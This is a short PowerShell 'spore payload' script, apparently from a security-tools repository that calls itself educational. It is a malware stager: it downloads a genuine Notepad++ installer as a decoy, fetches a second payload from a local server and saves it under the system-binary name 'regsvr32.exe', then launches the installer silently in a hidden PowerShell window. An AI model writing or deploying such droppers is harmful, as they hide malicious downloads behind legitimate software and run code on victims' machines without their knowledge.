# -------------------------------------------------------------------------
# SECURITY RESEARCH & EDUCATIONAL PURPOSES ONLY
# This script is part of the BugWare repository, a collection of security tools
# and PoCs for learning about attack vectors.
# DO NOT USE THIS FOR ILLEGAL PURPOSES.
# -------------------------------------------------------------------------

<#
.SYNOPSIS
    Spore Payload Script
.DESCRIPTION
    Retrieves and executes additional stages of the infection chain (Notepad++ / regsvr32).
.AUTHOR
    CyberPanther232
#>

$NOTEPAD_PP_DOWNLOAD = "https://github.com/notepad-plus-plus/notepad-plus-plus/releases/download/v8.8.1/npp.8.8.1.Installer.x64.exe"
$FUNGUS_URL = "http://localhost:8081/fungus"

Invoke-WebRequest -Uri "$NOTEPAD_PP_DOWNLOAD" -OutFile "C:\Temp\notepad_plus.exe"
Invoke-WebRequest -Uri "$FUNGUS_URL" -OutFile "C:\Temp\regsvr32.exe"

powershell -nop -w hidden -c "cmd.exe /C 'C:\Temp\notepad_plus.exe /S /b'"
